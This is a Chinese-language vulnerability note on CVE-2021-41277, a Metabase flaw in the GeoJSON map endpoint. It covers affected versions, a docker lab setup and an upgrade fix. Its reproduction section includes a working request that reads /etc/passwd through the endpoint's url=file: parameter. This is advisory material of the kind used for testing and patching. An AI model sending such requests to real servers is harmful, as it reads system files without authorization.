
# 0X00 漏洞信息
Metabase 是一个简单、开源的数据分析平台。Metabase 是基于 AGPL 协议的开源项目，其提供了多种安装方式，包括 docker 镜像、Mac、和 jar 包，安装几乎没有门槛，是一个简单而强大的分析工具，让任何人都可以从他们公司的数据中学习和做出决策。数据分析人员通过建立一个“查询”（Metabase 中定义为 Question）来提炼数据，再通过仪表盘（Dashboards）来组合展示给公司成员。攻击者可在未经身份验证的情况下获取系统敏感信息。<br />在受影响的版本中，自定义 GeoJSON 地图（admin->settings->maps->custom maps->add a map）操作缺少权限验证，攻击者可通过该漏洞获得敏感信息。


# 0X01 漏洞概述
| 漏洞名称 | Metabase 敏感信息泄露漏洞 |
| --- | --- |
| 漏洞等级 | 高危 |
| CVE编号 | CVE-2021-41277 |
| CNVD编号 |  |
| CNNVD编号 |  |
| 其他编号 |  |
| 披露时间 | 2021.09.15 |
| 分数 | 7.5 |
| CVSS | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N |
| 披露链接 | [https://nvd.nist.gov/vuln/detail/CVE-2021-41277](https://nvd.nist.gov/vuln/detail/CVE-2021-41277) |


# 0X02 影响范围
**受影响版本：**<br />metabase version < 0.40.5<br />metabase version >= 1.0.0, < 1.40.5

**修复版本：**<br />metabase version >= 0.40.5<br />metabase version >= 1.40.5


# 0X03 环境搭建
```javascript
docker pull vulfocus/metabase-cve_2021_41277:latest
docker run -d -p 8080:3000 docker.io/vulfocus/metabase-cve_2021_41277
```

也可通过 [http://vulfocus.fofa.so/](http://vulfocus.fofa.so/) 进行测试。


# 0X04 代码审计
暂无


# 0X05 漏洞复现
```javascript
http://192.168.1.40:8080/api/geojson?url=file:/etc/passwd
```
![image-20211122111233436.png](_img/assets/1660288163008-95480280-46b9-4200-8cdd-c7150f60fada.png)



# 0X05 POC
暂无


# 0X06 解决方案
参考漏洞影响范围，及时升级至最新安全版本：[https://github.com/metabase/metabase](https://github.com/metabase/metabase)
